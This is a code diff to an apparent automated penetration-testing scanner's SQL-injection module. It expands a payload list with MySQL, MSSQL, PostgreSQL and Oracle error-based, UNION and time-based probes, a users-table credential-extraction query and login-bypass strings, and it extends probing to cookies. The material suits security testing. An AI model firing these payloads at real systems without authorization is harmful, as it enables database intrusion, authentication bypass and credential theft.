@@ -44,20 +44,44 @@ DBMS_ERROR_PATTERNS = [
 SQLI_PROBES = [
     # Error-based (fast — run first)
     {"payload": "'", "type": "error_based", "desc": "Single Quote SQL Syntax Error"},
-    {"payload": "1' AND ExtractValue(1, CONCAT(0x5c, 'penflow_sqli'))--", "marker": "penflow_sqli", "type": "error_based", "desc": "ExtractValue XML Error Injection"},
-    {"payload": "1' AND 1=CONVERT(int, (SELECT 'penflow_sqli'))--", "marker": "penflow_sqli", "type": "error_based", "desc": "MSSQL Convert Error Injection"},
+    {"payload": "1' AND ExtractValue(1, CONCAT(0x5c, 'penflow_sqli'))-- ", "marker": "penflow_sqli", "type": "error_based", "desc": "ExtractValue XML Error Injection"},
+    {"payload": "1' AND 1=CONVERT(int, (SELECT 'penflow_sqli'))-- ", "marker": "penflow_sqli", "type": "error_based", "desc": "MSSQL Convert Error Injection"},
+    {"payload": "1' AND (SELECT ExtractValue(1, CONCAT('~', 'penflow_sqli'))) FROM dual-- ", "marker": "penflow_sqli", "type": "error_based_oracle", "desc": "Oracle ExtractValue Error Injection"},
+    {"payload": "1' AND 1=CTXSYS.DRITHSX.SN(1, 'penflow_sqli')-- ", "marker": "penflow_sqli", "type": "error_based_oracle", "desc": "Oracle CTXSYS Error Injection"},
 
     # UNION-based data extraction & column reflection
-    {"payload": "' UNION SELECT 'penflow_union_mark', NULL--", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query Column 1 String Injection"},
-    {"payload": "' UNION SELECT NULL, 'penflow_union_mark'--", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query Column 2 String Injection"},
-    {"payload": "' UNION SELECT NULL, NULL, 'penflow_union_mark'--", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query Column 3 String Injection"},
-    {"payload": "' UNION SELECT username, password FROM users--", "marker": "administrator", "type": "union_data_extraction", "desc": "UNION Users Table Record Extraction"},
+    # 1 column
+    {"payload": "' UNION SELECT 'penflow_union_mark'-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 1 Col, Pos 1"},
+    # 2 columns
+    {"payload": "' UNION SELECT 'penflow_union_mark', NULL-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 2 Col, Pos 1"},
+    {"payload": "' UNION SELECT NULL, 'penflow_union_mark'-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 2 Col, Pos 2"},
+    # 3 columns
+    {"payload": "' UNION SELECT 'penflow_union_mark', NULL, NULL-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 3 Col, Pos 1"},
+    {"payload": "' UNION SELECT NULL, 'penflow_union_mark', NULL-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 3 Col, Pos 2"},
+    {"payload": "' UNION SELECT NULL, NULL, 'penflow_union_mark'-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 3 Col, Pos 3"},
+    # 4 columns
+    {"payload": "' UNION SELECT 'penflow_union_mark', NULL, NULL, NULL-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 4 Col, Pos 1"},
+    {"payload": "' UNION SELECT NULL, 'penflow_union_mark', NULL, NULL-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 4 Col, Pos 2"},
+    {"payload": "' UNION SELECT NULL, NULL, 'penflow_union_mark', NULL-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 4 Col, Pos 3"},
+    {"payload": "' UNION SELECT NULL, NULL, NULL, 'penflow_union_mark'-- ", "marker": "penflow_union_mark", "type": "union_based", "desc": "UNION Query 4 Col, Pos 4"},
+
+    # Oracle equivalents
+    {"payload": "' UNION SELECT 'penflow_union_mark' FROM dual-- ", "marker": "penflow_union_mark", "type": "union_based_oracle", "desc": "Oracle UNION 1 Col, Pos 1"},
+    {"payload": "' UNION SELECT 'penflow_union_mark', NULL FROM dual-- ", "marker": "penflow_union_mark", "type": "union_based_oracle", "desc": "Oracle UNION 2 Col, Pos 1"},
+    {"payload": "' UNION SELECT NULL, 'penflow_union_mark' FROM dual-- ", "marker": "penflow_union_mark", "type": "union_based_oracle", "desc": "Oracle UNION 2 Col, Pos 2"},
+    {"payload": "' UNION SELECT 'penflow_union_mark', NULL, NULL FROM dual-- ", "marker": "penflow_union_mark", "type": "union_based_oracle", "desc": "Oracle UNION 3 Col, Pos 1"},
+    {"payload": "' UNION SELECT NULL, 'penflow_union_mark', NULL FROM dual-- ", "marker": "penflow_union_mark", "type": "union_based_oracle", "desc": "Oracle UNION 3 Col, Pos 2"},
+    {"payload": "' UNION SELECT NULL, NULL, 'penflow_union_mark' FROM dual-- ", "marker": "penflow_union_mark", "type": "union_based_oracle", "desc": "Oracle UNION 3 Col, Pos 3"},
+
+    {"payload": "' UNION SELECT username, password FROM users-- ", "marker": "administrator", "type": "union_data_extraction", "desc": "UNION Users Table Record Extraction"},
+    {"payload": "' UNION SELECT username, password FROM users FROM dual-- ", "marker": "administrator", "type": "union_data_extraction_oracle", "desc": "Oracle UNION Users Table Record Extraction"},
 
     # Time-based blind — 2s sleep (reduced from 3s to stay within timeout budget)
-    {"payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--", "sleep": 2, "type": "time_based_mysql", "desc": "MySQL Time-Based Sleep"},
-    {"payload": "1'; SELECT pg_sleep(2);--", "sleep": 2, "type": "time_based_postgres", "desc": "PostgreSQL Time-Based Sleep"},
-    {"payload": "1'; WAITFOR DELAY '0:0:2';--", "sleep": 2, "type": "time_based_mssql", "desc": "MSSQL WAITFOR DELAY"},
-    {"payload": "x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END--", "sleep": 2, "type": "time_based_cookie", "desc": "Cookie Blind SQLi Sleep"},
+    {"payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- ", "sleep": 2, "type": "time_based_mysql", "desc": "MySQL Time-Based Sleep"},
+    {"payload": "1'; SELECT pg_sleep(2);-- ", "sleep": 2, "type": "time_based_postgres", "desc": "PostgreSQL Time-Based Sleep"},
+    {"payload": "1'; WAITFOR DELAY '0:0:2';-- ", "sleep": 2, "type": "time_based_mssql", "desc": "MSSQL WAITFOR DELAY"},
+    {"payload": "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 2)-- ", "sleep": 2, "type": "time_based_oracle", "desc": "Oracle Time-Based Sleep"},
+    {"payload": "x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END-- ", "sleep": 2, "type": "time_based_cookie", "desc": "Cookie Blind SQLi Sleep"},
 ]
 
 
@@ -128,7 +152,8 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                 headers_override = {}
                 if cookie_name:
                     test_url = base_url
-                    headers_override = {"Cookie": f"{cookie_name}={payload}"}
+                    encoded_payload = urllib.parse.quote(payload)
+                    headers_override = {"Cookie": f"{cookie_name}={encoded_payload}"}
                 elif param:
                     qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                     qs[param] = [payload]
@@ -153,7 +178,7 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                         # 1. Delay MUST occur on a valid 2xx response (NOT on 400, 404, 405, 5xx errors!)
                         # 2. Check if elapsed time exceeded sleep duration (with baseline buffer)
                         # 3. Send negative non-sleep request to ensure server isn't just universally lagging
-                        if resp_sleep and resp_sleep.status_code in (200, 201, 202, 204, 301, 302, 307, 308) and elapsed_sleep >= (t_base + sleep_time - 0.5):
+                        if resp_sleep and resp_sleep.status_code in (200, 201, 202, 204, 301, 302, 307, 308) and elapsed_sleep >= (t_base + sleep_time - 0.7):
                             # Verification Phase: Send normal non-sleep request
                             t_verify_start = time.time()
                             exch_verify = await http_client.send_as_identity(
@@ -186,12 +211,11 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                                 evidence["sqli_confirmed"] = True
                                 break
                     elif p_type.startswith("union_"):
-                        if cookie_name:
-                            continue
                         exch_union = await http_client.send_as_identity(
                             identity_id="anonymous_guest",
                             method="GET",
-                            url=test_url
+                            url=test_url,
+                            headers=headers_override if headers_override else None
                         )
                         resp_u = exch_union.response
                         if not resp_u or resp_u.status_code != 200:
@@ -221,12 +245,11 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                             evidence["sqli_confirmed"] = True
                             break
                     else:
-                        if cookie_name:
-                            continue  # Run error probes primarily on query params
                         exch_err = await http_client.send_as_identity(
                             identity_id="anonymous_guest",
                             method="GET",
-                            url=test_url
+                            url=test_url,
+                            headers=headers_override if headers_override else None
                         )
                         resp_err = exch_err.response
                         if not resp_err:
@@ -268,7 +291,8 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                             evidence["sqli_confirmed"] = True
                             break
                 except Exception as e:
-                    logger.debug(f"[{self.name}] SQLi probe error on {test_url}: {e}")
+                    print(f"DEBUG SQLI ERROR processing probe {p_type}: {e}")
+                    logger.debug(f"[{self.name}] Probe '{p_type}' failed on {test_url}: {e}")
 
             if findings:
                 break
@@ -312,7 +336,7 @@ class SQLiCapabilityAgent(BaseCapabilityAgent):
                 csrf_m = re.search(r'name=["\'](?:csrf|_csrf|csrf_token|authenticity_token)["\']\s+value=["\']([^"\']+)["\']', get_resp.response.body_text or "", re.I)
                 csrf_token = csrf_m.group(1) if csrf_m else ""
 
-                bypass_payloads = ["administrator'--", "' OR 1=1--", "admin' /*", "admin' or '1'='1"]
+                bypass_payloads = ["administrator'-- ", "' OR 1=1-- ", "admin' /*", "admin' or '1'='1"]
                 for p in bypass_payloads:
                     post_data = {"username": p, "password": "PenFlowAuditPassword123!"}
                     if csrf_token:
